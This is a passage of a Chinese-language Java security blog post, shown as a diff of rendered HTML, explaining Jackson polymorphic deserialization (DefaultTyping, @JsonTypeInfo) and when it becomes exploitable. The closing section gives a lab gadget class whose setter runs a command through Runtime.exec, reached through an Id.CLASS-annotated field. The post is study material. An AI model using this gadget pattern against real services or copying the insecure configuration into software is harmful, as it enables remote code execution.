+</span></span><span class="line"><span class="cl">        return String.format(&#34;Person.age=%d, Person.name=%s, %s, %s&#34;, age, name, object == null ? &#34;null&#34; : object, sex == null ? &#34;null&#34; : sex);
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改Test</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Person person = new Person();
+</span></span><span class="line"><span class="cl">person.age = 20;
+</span></span><span class="line"><span class="cl">person.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">person.object = new hack();
+</span></span><span class="line"><span class="cl">person.sex = new MySex();
+</span></span><span class="line"><span class="cl">ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">String json = mapper.writeValueAsString(person);
+</span></span><span class="line"><span class="cl">System.out.println(json);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Person person1 = mapper.readValue(json, Person.class);
+</span></span><span class="line"><span class="cl">System.out.println(person1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734519148410-f3e9a26b-18a0-4df9-af8a-1520ba4b9418.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>可以看到该<font style="color:rgb(80, 80, 92);">Interface类属性被成功序列化和反序列化</font></p>
+<p>不设置运行后报错</p>
+<h4 id="non_concrete_and_arrays">NON_CONCRETE_AND_ARRAYS
+</h4><p><font style="color:rgb(80, 80, 92);">NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。</font></p>
+<p><font style="color:rgb(80, 80, 92);">编写序列化与反序列化的代码，在 Object 属性中存在的是数组：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">  Person person = new Person();
+</span></span><span class="line"><span class="cl">  person.age = 20;
+</span></span><span class="line"><span class="cl">  person.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">  hack[] hacks = new hack[2];
+</span></span><span class="line"><span class="cl">  hacks[0] = new hack();
+</span></span><span class="line"><span class="cl">  hacks[1] = new hack();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  person.object = hacks;
+</span></span><span class="line"><span class="cl">  person.sex = new MySex();
+</span></span><span class="line"><span class="cl">  ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  String json = mapper.writeValueAsString(person);
+</span></span><span class="line"><span class="cl">  System.out.println(json);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Person person1 = mapper.readValue(json, Person.class);
+</span></span><span class="line"><span class="cl">  System.out.println(person1);
+</span></span><span class="line"><span class="cl">}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>``{&ldquo;age&rdquo;:20,&ldquo;name&rdquo;:&ldquo;ygsr&rdquo;,&ldquo;object&rdquo;:[&quot;<strong>[L</strong>JAVA_LANG_OBJECT.hack;&quot;,[[&ldquo;JAVA_LANG_OBJECT.hack&rdquo;,{&ldquo;skill&rdquo;:&ldquo;dance&rdquo;}],[&ldquo;JAVA_LANG_OBJECT.hack&rdquo;,{&ldquo;skill&rdquo;:&ldquo;dance&rdquo;}]]],&ldquo;sex&rdquo;:[&ldquo;OBJECT_AND_NON_CONCRETE.MySex&rdquo;,{&ldquo;sex&rdquo;:0}]}</p>
+<p><font style="color:rgb(80, 80, 92);">类名变成了 </font><code>”[L”+类名+”;”</code><font style="color:rgb(80, 80, 92);">，序列化 Object 之后为数组形式，反序列化之后得到</font><code>[Lcom.mi1k7ea.Hacker;</code><font style="color:rgb(80, 80, 92);"> 类对象，说明对 Array 类型成功进行了序列化和反序列化：</font></p>
+<p><font style="color:rgb(80, 80, 92);"></font></p>
+<h4 id="non_final">NON_FINAL
+</h4><p><font style="color:rgb(80, 80, 92);">NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。</font></p>
+<p><font style="color:rgb(80, 80, 92);">这个不演示了</font></p>
+<p><font style="color:rgb(80, 80, 92);"></font></p>
+<h4 id="小结">小结
+</h4><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520389120-285b5f34-3346-4e39-ab92-b0df63c1515a.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="jsontypeinfo-注解">@JsonTypeInfo 注解
+</h3><p><code>@JsonTypeInfo</code><font style="color:rgb(80, 80, 92);"> 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  
+</span></span><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  
+</span></span><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  
+</span></span><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)  
+</span></span><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="jsontypeinfoidnone">JsonTypeInfo.Id.NONE
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Person2 p = new Person2();
+</span></span><span class="line"><span class="cl">p.age = 6;
+</span></span><span class="line"><span class="cl">p.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">p.object = new hack();
+</span></span><span class="line"><span class="cl">ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">String json = mapper.writeValueAsString(p);
+</span></span><span class="line"><span class="cl">System.out.println(json);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Person2 p2 = mapper.readValue(json, Person2.class);
+</span></span><span class="line"><span class="cl">System.out.println(p2);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public int age;
+</span></span><span class="line"><span class="cl">public String name;
+</span></span><span class="line"><span class="cl">//加上注解
+</span></span><span class="line"><span class="cl">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
+</span></span><span class="line"><span class="cl">public Object object;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@Override
+</span></span><span class="line"><span class="cl">public String toString() {
+</span></span><span class="line"><span class="cl">  return String.format(&#34;Person.age=%d, Person.name=%s, %s&#34;, age, name, object == null ? &#34;null&#34; : object);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520607757-07da6baa-8208-4575-a906-aff1b8769f2f.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>不加注解结果也是一样</p>
+<h4 id="jsontypeinfoidclass">JsonTypeInfo.Id.CLASS
+</h4><p><font style="color:rgb(80, 80, 92);">修改 Person2 类中的 object 属性</font><font style="color:rgb(80, 80, 92);"> </font><code>@JsonTypeInfo</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">注解值为</font><font style="color:rgb(80, 80, 92);"> </font><code>JsonTypeInfo.Id.CLASS</code></p>
+<p><font style="color:rgb(80, 80, 92);">输出看到，object属性中多了 </font><code>&quot;@class&quot;:&quot;com.drunkbaby.Hacker&quot;</code><font style="color:rgb(80, 80, 92);"> ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</font><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520660816-eb5d5c52-8716-407b-80bf-a2e0f91d7e7e.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><font style="color:rgb(80, 80, 92);">也就是说，在Jackson反序列化的时候如果使用了</font><code>JsonTypeInfo.Id.CLASS</code><font style="color:rgb(80, 80, 92);">修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</font></p>
+<p><font style="color:rgb(80, 80, 92);"></font></p>
+<h4 id="jsontypeinfoidminimal_class">JsonTypeInfo.Id.MINIMAL_CLASS
+</h4><p><font style="color:rgb(80, 80, 92);">修改 Person2 类中的object属性</font><font style="color:rgb(80, 80, 92);"> </font><code>@JsonTypeInfo</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">注解值为</font><font style="color:rgb(80, 80, 92);"> </font><code>JsonTypeInfo.Id.MINIMAL_CLASS</code></p>
+<p><font style="color:rgb(80, 80, 92);">输出看到，object属性中多了 </font><code>&quot;@c&quot;:&quot;com.drunkbaby.Hacker&quot;</code><font style="color:rgb(80, 80, 92);">，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</font></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520758225-ebbb6d35-e2fc-4196-9b61-c267e90e6732.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h4 id="jsontypeinfoidname">JsonTypeInfo.Id.NAME
+</h4><p><font style="color:rgb(80, 80, 92);">修改 Person2 类中的object属性</font><font style="color:rgb(80, 80, 92);"> </font><code>@JsonTypeInfo</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">注解值为</font><font style="color:rgb(80, 80, 92);"> </font><code>JsonTypeInfo.Id.NAME</code></p>
+<p><font style="color:rgb(80, 80, 92);">输出看到，object 属性中多了 </font><code>&quot;@type&quot;:&quot;Hacker&quot;</code><font style="color:rgb(80, 80, 92);">，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</font></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520801555-cc12309b-ea3c-4a23-beb6-b59cf978294a.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h4 id="jsontypeinfoidcustom">JsonTypeInfo.Id.CUSTOM
+</h4><p><font style="color:rgb(80, 80, 92);">这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常</font></p>
+<p><font style="color:rgb(80, 80, 92);"></font></p>
+<h2 id="反序列化中类属性方法的调用">反序列化中类属性方法的调用
+</h2><h3 id="使用-defaulttyping">使用 DefaultTyping
+</h3><p>给MySex类加上构造方法</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521118466-d6e22222-2c02-4a35-b3e2-1c33b881a25c.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Test只进行反序列化和<code>enableDefaultTyping</code>无参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl"> Person person = new Person();
+</span></span><span class="line"><span class="cl">  person.age = 20;
+</span></span><span class="line"><span class="cl">  person.name = &#34;ygsr&#34;;
+</span></span><span class="line"><span class="cl">  person.sex = new MySex();
+</span></span><span class="line"><span class="cl">  ObjectMapper mapper = new ObjectMapper();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  mapper.enableDefaultTyping();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//  String json = mapper.writeValueAsString(person);
+</span></span><span class="line"><span class="cl">//  System.out.println(json);
+</span></span><span class="line"><span class="cl">    String json = &#34;{\&#34;age\&#34;:20,\&#34;name\&#34;:\&#34;ygsr\&#34;,\&#34;object\&#34;:null,\&#34;sex\&#34;:[\&#34;OBJECT_AND_NON_CONCRETE.MySex\&#34;,{\&#34;sex\&#34;:0}]}&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Person person1 = mapper.readValue(json, Person.class);
+</span></span><span class="line"><span class="cl">  System.out.println(person1);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521308903-6e4beda5-6c8d-4be0-a908-d065d024a076.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>调用了构造方法和set方法</p>
+<h3 id="使用-jsontypeinfo-注解">使用 @JsonTypeInfo 注解
+</h3><p>Person类加上注解</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521381465-bcb98993-d2c8-443b-8ca2-6600c57b8294.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>结果和上面使用<font style="color:rgb(80, 80, 92);">DefaultTyping 一样</font></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521410100-1a538f28-b030-430d-8731-169c6f7811cb.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="jackson-反序列化调试分析">Jackson 反序列化调试分析
+</h3><p>打上断点后调试</p>
+<p>先进行JsonToken初始化</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522336918-60e7d3ae-86d1-4440-87ad-0e2456846dd1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>跳到<code>ObjectMapper</code>,进行反序列化</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522510798-83b0d60a-12b4-4b41-bc76-83bd0dc7e849.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>进入后到<code>BeanDeserializer</code></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522553118-0d1d0234-c01d-475c-81ff-f1b4f01b1339.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>进入后跳到<code>vanillaDeserialize</code>方法</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522639390-d80c8536-f1e1-4de3-b06e-6c4a26272fc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>跟进到</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522942606-6b31f24f-1d06-48a0-ad24-13e309f85ce1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>继续跟进</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734522967470-721a9781-4946-4a50-8deb-146533057e6c.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>这里判断<code>JsonToken</code>是否为空</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523086447-a0a598e8-b323-4e35-a2c3-b38801fdebfd.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+> 一直跟下去</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523228539-0dfb70a8-b472-4633-b9bf-18203a6d24d3.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523366153-2817295e-d89e-4789-8377-195ccfb69c97.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523397062-8ad64717-89a8-4d61-9b32-8fc04b8a4622.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>前面应该对每个属性进行逐一反序列化调用每个属性的setter方法赋值,这里轮到了sex属性,跟进</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523412296-9ca18b82-3984-47e7-aff4-1e838b9f2763.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523524604-4f5bba12-bda1-44f9-964a-d69da42a9f69.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>这里就进到Mysex的setter方法去了,其实一开始应该是到call方法去,从而进到Mysex的构造方法里</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734523942301-4e4357ce-bded-4f46-ac31-7d909e5e3e28.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)
+</span></span><span class="line"><span class="cl">createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)
+</span></span><span class="line"><span class="cl">vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser)
+</span></span><span class="line"><span class="cl">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)
+</span></span><span class="line"><span class="cl">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)
+</span></span><span class="line"><span class="cl">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)
+</span></span><span class="line"><span class="cl">main:19, Test (OBJECT_AND_NON_CONCRETE)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="结论">结论
+</h3><p><strong>在 Jackson 反序列化中，若调用了 <strong><code>**enableDefaultTyping()**</code></strong> 函数或使用 <strong><code>**@JsonTypeInfo**</code></strong> 注解指定反序列化得到的类的属性为 <strong><code>**JsonTypeInfo.Id.CLASS**</code></strong> 或 <strong><code>**JsonTypeInfo.Id.MINIMAL_CLASS**</code></strong>，则会调用该属性的类的构造函数和 setter 方法。</strong></p>
+<h2 id="jackson-反序列化漏洞">Jackson 反序列化漏洞
+</h2><h3 id="前提条件">前提条件
+</h3><p><font style="color:rgb(80, 80, 92);">满足下面三个条件之一即存在Jackson反序列化漏洞：</font></p>
+<ul>
+<li>调用了 <code>ObjectMapper.enableDefaultTyping()</code> 函数；</li>
+<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
+<li>对要进行反序列化的类的属性使用了值为 <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> 的 <code>@JsonTypeInfo</code> 注解；</li>
+</ul>
+<h3 id="漏洞场景">漏洞场景
+</h3><h4 id="属性不为object类时">属性不为Object类时
+</h4><p>给MySex的setter方法里加入恶意代码</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524308342-2ca7cec0-2a85-4249-8367-a72fbdabe8b0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>反序列化完后弹计算器</p>
+<p><img src="F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734524353562-3df34534-a44c-46dd-ab86-7101a728c07b.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>一般来说这都是程序员才能修改源码,谁家好人会放后门在自己的源码里</p>
+<h4 id="属性为-object-类时">属性为 Object 类时
+</h4><p><strong>当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public class evil {
+</span></span><span class="line"><span class="cl">    public String cmd;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public evil() {
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public String getCmd() {
+</span></span><span class="line"><span class="cl">        return cmd;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void setCmd(String cmd) {
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        this.cmd = cmd;
+</span></span><span class="line"><span class="cl">        try
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">            Runtime.getRuntime().exec(this.cmd);
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        }catch (Exception e)
+</span></span><span class="line"><span class="cl">        {
+</span></span><span class="line"><span class="cl">            e.printStackTrace();
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">import com.fasterxml.jackson.annotation.JsonTypeInfo;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">public class EvilPerson {
+</span></span><span class="line"><span class="cl">    public int age;
+</span></span><span class="line"><span class="cl">    public String name;
+</span></span><span class="line"><span class="cl">    @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
+</span></span><span class="line"><span class="cl">    public Object object;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public EvilPerson() {
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public int getAge() {
+</span></span><span class="line"><span class="cl">        return age;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void setAge(int age) {
+</span></span><span class="line"><span class="cl">        this.age = age;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public String getName() {
+</span></span><span class="line"><span class="cl">        return name;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void setName(String name) {
+</span></span><span class="line"><span class="cl">        this.name = name;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public Object getObject() {
+</span></span><span class="line"><span class="cl">        return object;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public void setObject(Object object) {
+</span></span><span class="line"><span class="cl">        this.object = object;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    @Override
+</span></span><span class="line"><span class="cl">    public String toString() {
+</span></span><span class="line"><span class="cl">        return &#34;EvilPerson{&#34; +
+</span></span><span class="line"><span class="cl">                &#34;age=&#34; + age +
